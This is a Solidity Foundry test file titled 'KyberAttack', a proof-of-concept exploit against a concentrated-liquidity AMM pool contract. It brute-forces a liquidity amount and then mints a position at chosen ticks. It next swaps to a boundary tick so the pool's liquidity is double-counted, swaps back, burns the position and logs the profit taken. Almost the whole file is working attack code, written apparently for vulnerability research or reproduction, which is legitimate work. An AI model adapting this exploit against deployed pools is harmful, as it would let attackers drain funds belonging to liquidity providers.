
import "forge-std/Test.sol";

import "openzeppelin-contracts/token/ERC20/ERC20.sol";

import "../contracts/Pool.sol";
import "../contracts/Factory.sol";
import "../contracts/oracle/PoolOracle.sol";
import "../contracts/libraries/TickMath.sol";

import "../contracts/libraries/SwapMath.sol";
import "../contracts/periphery/libraries/LiquidityMath.sol";

contract Token is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}


contract KyberAttack is Test {
    Factory factory;
    Pool pool;
    Pool pool2;
    Token token0 = new Token("token0", "TKN1");
    Token token1 = new Token("token1", "TKN2");
    Token token2 = new Token("token2", "TKN3");
   
    int24 lower = -11311;
    int24 upper = lower + 100;

    uint128 rangeLiquidity;
    bool flag = true;
    uint256 constant INITIAL_AMOUNT = 20_0000 ether;

    function setUp() public {
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");


        PoolOracle oracle = new PoolOracle();
        oracle.initialize();
        factory = new Factory(0, address(oracle));
        factory.addNFTManager(address(this));
        pool = Pool(factory.createPool(address(token0), address(token1), 10));
        pool2 = Pool(factory.createPool(address(token0), address(token1),8));

        token0 = Token(address(pool.token0()));
        token1 = Token(address(pool.token1()));

        // // total amount 20_000 ether
        token0.mint(address(this), INITIAL_AMOUNT / 2);
        token1.mint(address(this), INITIAL_AMOUNT / 2);

  
    }

    function mintCallback(uint256 qty0, uint256 qty1, bytes calldata data) external {
        if (qty0 > 0) {
            token0.transfer(msg.sender, qty0);
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, qty1);
        }
    }

    function swapCallback(int256 qty0, int256 qty1, bytes calldata data) external {
        // console2.log("Swap qty0", qty0);
        // console2.log("Swap qty1", qty1);
        if (qty0 > 0) {
            token0.transfer(msg.sender, uint256(qty0));
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, uint256(qty1));
        }
    }



    function testBruteForceExploit2() public {
        
        // testBruteForceExploit3();
        // set price to 1, currentTick = 0
        token0.mint(address(pool), 10000 ether);
        token1.mint(address(pool), 10000 ether);
        pool.unlockPool(8 * 2 ** 96);
         (,,,bool locked) = pool.getPoolState();
        console2.log("locked", locked);
        // pool.flash(address(this),10000 ether , 10000 ether, abi.encodePacked(uint256(10000 ether), uint256(10000 ether)));
        uint160 lowerSqrtP = TickMath.getSqrtRatioAtTick(lower);
        uint160 upperSqrtP = TickMath.getSqrtRatioAtTick(upper);
        
        // console2.log("-111311", TickMath.getSqrtRatioAtTick(-111311));
        // console2.log("-111310", TickMath.getSqrtRatioAtTick(-111310));

        // token1 -> token0, swap to lower tick (we'll be the only LP here)
        pool.swap(address(this), type(int256).max, true, TickMath.getSqrtRatioAtTick(upper), "");
     
       
        // calc the rough amount of liquidity with amount of 100 ether
        uint128 initLiquidity = LiquidityMath.getLiquidityFromQty0(lowerSqrtP, upperSqrtP, 100 ether);
        console2.log("initLiquidity",initLiquidity);
        uint128 adjustedLiquidity = 11390268842170871355143;
        uint256 exploitableToken1Amount = 100005025313873252294;
        // {
        //     (uint128 L, uint128 reinvestL,) = pool.getLiquidityState();
        //     // find a exploitable liquidity value and adjust our liquidity amount
        //     (adjustedLiquidity, exploitableToken1Amount) =
        //         findExploitableLiquidity2(initLiquidity, upperSqrtP, lowerSqrtP);
        //     rangeLiquidity = adjustedLiquidity - reinvestL - L;

        //     // add out-of-range liquidity [lower, upper]
        //     pool.mint(address(this), lower, upper, [TickMath.MIN_TICK, lower], rangeLiquidity, "");

        //     // (L, reinvestL,) = pool.getLiquidityState();
        //     // assertEq(L + reinvestL, adjustedLiquidity);
        // }
        console2.log("adjustedLiquidity",adjustedLiquidity);
        console2.log("exploitableToken1Amount",exploitableToken1Amount);
         (uint128 L, uint128 reinvestL,) = pool.getLiquidityState();
        rangeLiquidity = adjustedLiquidity - reinvestL - L;
        pool.mint(address(this), lower, upper, [TickMath.MIN_TICK, lower], rangeLiquidity, "");
        (L, reinvestL,) = pool.getLiquidityState();
        assertEq(L , 0 ,"L not 0");


        pool.swap(address(this), int256(exploitableToken1Amount), true, TickMath.MIN_SQRT_RATIO + 1, "");
        console2.log("token0 of pool", token0.balanceOf(address(pool)) /1e18);
        console2.log("token1 of pool", token1.balanceOf(address(pool))  /1e18  );
                console2.log("token0 of this", token0.balanceOf(address(this)) /1e18);
        console2.log("token1 of this", token1.balanceOf(address(this)) /1e18);
        
         // after this swap, we have currentTick == nearestCurrentTick(swap out of the range),
        // but current liquidity is not reduced as expected
        (uint160 sqrtP, int24 currentTick, int24 nearestCurrentTick,) = pool.getPoolState();
        console2.log("currentTick", currentTick);
        assertEq(currentTick, lower - 1 , "nexttick should be cururrentTick + 1 ");
        assertLt(sqrtP, lowerSqrtP, "end price should be lower of the upper price");

        (uint128 origLiquidity,,) = pool.getLiquidityState();
        console2.log("origLiquidity:", origLiquidity);


        {
            pool.swap(address(this), type(int256).min, true, TickMath.getSqrtRatioAtTick(lower), "");
            (uint128 newLiquidity,,) = pool.getLiquidityState();
            // liquidity is doubled!!!!
            console2.log("newLiquidity:", newLiquidity);
            assertEq(newLiquidity, 2 * origLiquidity, "liquidity should be doubled");
        }

        (int256 deltaQty0, int256 deltaQty1) = pool.swap(address(this), type(int256).max, false, TickMath.getSqrtRatioAtTick(1000), "");

        // remove liquidity
        pool.burn(lower, upper, rangeLiquidity);


        console2.log("token0 of pool", token0.balanceOf(address(pool)) /1e18);
        console2.log("token1 of pool", token1.balanceOf(address(pool))  /1e18  );
                console2.log("token0 of this", token0.balanceOf(address(this)) /1e18);
        console2.log("token1 of this", token1.balanceOf(address(this)) /1e18);
        uint256 profit = token0.balanceOf(address(this)) + token1.balanceOf(address(this)) - INITIAL_AMOUNT;
        console2.log("profit", profit / 1e18, "ether");



    }


    // brute force to find a valid liquidity number that will result in end price above the next price & end tick == next tick
    function findExploitableLiquidity2(uint128 liquidityStart, uint160 currentSqrtP, uint160 targetSqrtP)
        public
        view
        returns (uint128, uint256)
    {
        uint128 liquidity = liquidityStart;
        uint256 absDelta = 0;
        uint256 count = 0;
        while (true) {
            liquidity++;
            count++;

            // run the maths in SwamMath.computeSwapStep() to find a liquidity number
            // that satisfies the condition end_price > next_price when using (usedAmount - 1) to swap.
            int256 usedAmount = SwapMath.calcReachAmount(liquidity, currentSqrtP, targetSqrtP, 10, true, true);
            absDelta = uint256(usedAmount) - 1;
            uint256 deltaL = SwapMath.estimateIncrementalLiquidity(absDelta, liquidity, currentSqrtP, 10, true, true);
            uint160 nextSqrtP = uint160(SwapMath.calcFinalPrice(absDelta, liquidity, deltaL, currentSqrtP, true, true));

            if (nextSqrtP < targetSqrtP) {
                // console2.log("liquidity", liquidity);
                break;
            }
            if (count == 10_000_000) {
                revert("unable to find a valid liquidity number");
            }
        }

        return (liquidity, absDelta);
    }
   
}
